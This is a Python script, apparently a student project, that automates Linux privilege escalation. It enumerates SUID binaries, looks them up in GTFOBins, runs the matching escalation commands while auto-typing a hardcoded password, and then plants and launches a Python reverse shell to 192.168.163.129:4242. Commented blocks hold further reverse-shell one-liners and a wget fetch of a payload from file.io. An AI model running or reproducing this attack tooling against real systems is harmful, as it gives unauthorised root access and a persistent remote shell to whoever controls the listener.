import os,sys
import subprocess
from threading import Thread
from time import sleep
from git import Repo
from pyautogui import press, typewrite, hotkey

def line():
	print("-"*90)

def cleanJunks():
	os.system("rm -rf GTFOBLookup")
	os.system("rm -r SUIDs.txt")
	os.system("rm -r vulnerabilities.txt")
	os.system("rm -r whoami.txt")
	os.system("rm -r filteredVulnerabilities.txt")
	os.system("rm -r UsefulSUIDs.txt")
	sleep(0.1)
	
def cloneGTFOBins():
	print("Cloning in process...")
	os.system("git clone https://github.com/nccgroup/GTFOBLookup.git")
	sleep(0.2)

	print("Installing requirements...")
	os.system("pip install -r GTFOBLookup/requirements.txt")
	sleep(0.2)

	print("Installing new updates...")
	os.system("python3 GTFOBLookup/gtfoblookup.py update")

def findSUIDPermissions():
	os.system("find / -perm -04000 2>/dev/null > SUIDs.txt")

def findVulnerableSUIDs():
	os.system("python3 GTFOBLookup/gtfoblookup.py gtfobins search -f UsefulSUIDs.txt > vulnerabilities.txt")

def typePass():
	sleep(3)
	typewrite("1104\n")

def callVulnerableCommand(command):
	tmpThread=Thread(target=typePass)
	tmpThread.start()
	os.system(command)

	print("Testing if we got the root or not...")
	os.system("whoami > whoami.txt")
	whoamiFile=open("whoami.txt",'r')
	if whoamiFile.readline().find("root")!=-1:
		print("Privlege escallation successful")
		print("Calling command: exit")
		os.system("exit")
	else: 
		print("Privlege escallation failed for: ", x[0:5])

def executeWhoami():
	sleep(5)
	print("Typing command: whoami")
	typewrite("whoami\n")

# =================================================================================================================================
# Cloning GTFOBins...
# =================================================================================================================================

thread0=Thread(target=cloneGTFOBins)

line()
print("Cloning GTFOBins...")
thread0.start()

while thread0.is_alive():
	sleep(0.1)
print("Cloning successful !!!")
	
# =================================================================================================================================
# Code to find useful SUIDs
# =================================================================================================================================

thread1=Thread(target=findSUIDPermissions)

line()
print("Finding SUIDs...")
thread1.start()

while thread1.is_alive():
	sleep(0.1)
print("SUIDs found !!!")

line()
print("Filterning SUIDs (Phase 1)...")

suidPermissionsFile = open("SUIDs.txt",'r')
usefulSUIDFile = open("UsefulSUIDs.txt",'w')

# usefulSUIDs=list()
for x in suidPermissionsFile:
	if(x.startswith("/usr/bin/")):
		x=x[9:]
#		usefulSUIDs.append(x)
		usefulSUIDFile.write(x)

print("SUIDs filtered. Phase 1 completed !!! ")
suidPermissionsFile.close()
usefulSUIDFile.close()
# print(usefulSUIDs,end='')
# print("\n")

# =================================================================================================================================
# Code to filter the vulnerable SUIDs
# =================================================================================================================================

line()
print("Filterning SUIDs (Phase 2)...")

thread2= Thread(target=findVulnerableSUIDs)
thread2.start()
while thread2.is_alive():
	sleep(0.1)

print("SUIDs filtered. Phase 2 completed !!! ")

# =================================================================================================================================
# Code to extract commands from GTFOBins
# =================================================================================================================================

line()
print("Extracting commands from GTFOBins...")

vulnerabilities = open("vulnerabilities.txt",'r')
filteredVulnerabilities=list()
filteredVulnerabilitiesFile=open("filteredVulnerabilities.txt", 'w')

x="!!"
while x!= "":
	x=vulnerabilities.readline()
	if x.find("not found")==-1:
		if x.find("Code")!=-1:
			x=x.lstrip()
			x=x[6:]
			while x!='\n':
				x=x.lstrip()
				filteredVulnerabilities.append(x)
				filteredVulnerabilitiesFile.write(x)
				print(x)
				x=vulnerabilities.readline()
			filteredVulnerabilitiesFile.write('\n')

print("Commands extraction successful.")
print("Total commands found: ", len(filteredVulnerabilities))
vulnerabilities.close()
filteredVulnerabilitiesFile.close()


# =================================================================================================================================
# Code to run commands on new shell
# =================================================================================================================================

line()
print("Executing whoami...")

thread5 = Thread(target=executeWhoami)
thread5.start()

print("Command: whoami, executed in new thread...")


# =================================================================================================================================
# Code to execute vulnerable commands
# =================================================================================================================================

line()
print("Executing commands...")

if len(filteredVulnerabilities)!=0:
	filteredVulnerabilitiesFile=open("filteredVulnerabilities.txt",'r')
	x=""
	escallationStatus=0
	x=filteredVulnerabilitiesFile.readline()	
	while x!="":
		while x!="\n" and x!="":
			print("Trying to hack using command: ",x)
			thread = Thread(target=callVulnerableCommand, args=(x, ))
			thread.start()
			sleep(3)
			if thread.is_alive():
				escallationStatus=1
				print("Privlege escallation throgh the command successful! Command: ", x) 
				break
			x=filteredVulnerabilitiesFile.readline()
		if escallationStatus==1:
			break
		x=filteredVulnerabilitiesFile.readline()
	filteredVulnerabilitiesFile.close()

else:
	print("Command execution failed! No commands found...")
	print("Unable to exploit using GTFOBins")

# =================================================================================================================================
# Code to cleanup everything
# =================================================================================================================================

line()
print("Cleaning junks...")

thread00=Thread(target=cleanJunks)
thread00.start()

while thread00.is_alive():
	sleep(0.2)
print("Cleaning completed !!!\n")

# =================================================================================================================================
# Code to test root shell
# =================================================================================================================================

line()
print("Privlege escallation succesful!")
sleep(3)
print("Downloading shell script for reverse shell")

'''
typewrite("git clone https://github.com/nayanbhile/Final-Project-Priv-Escalation/blob/dc66fc0498a007b9a99f93bfab48894e06d89b3d/reverse.py\n")
sleep(1)
#typewrite("apt install wget\n")
#sleep(3)
typewrite("wget https://file.io/DiwxPOBGJgI6\n")
sleep(0.5)
typewrite("ls\n")
sleep(0.5)
typewrite("mv DiwxPOBGJgI6 reverse.py\n")
sleep(0.5)
#typewrite("python3 -c \'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.163.133\",2345)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);run([\"/bin/bash\",\"-i\"]);\n")
#typewrite("export RHOST=\"192.168.163.129\";export RPORT=4242;python -c \'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n")
'''

#typewrite("export RHOST=\"192.168.163.129\";export RPORT=4242;\n")
typewrite("echo \"import socket,os,pty;ip=\'192.168.163.129\';port=4242;binsh=\'/bin/sh\';s=socket.socket();s.connect((ip,port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(binsh)\" > tmpp.pyw\n")
typewrite("nohup python3 tmpp.pyw &\n")

'''
typewrite("export RHOST=\"192.168.163.129\";export RPORT=4242;export BINSH=\"/bin/sh\"\n")
typewrite("echo \"import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(BINSH)\" > tmpp.pyw\n")
typewrite("nohup python3 tmpp.pyw &\n")
'''


typewrite("exit\n")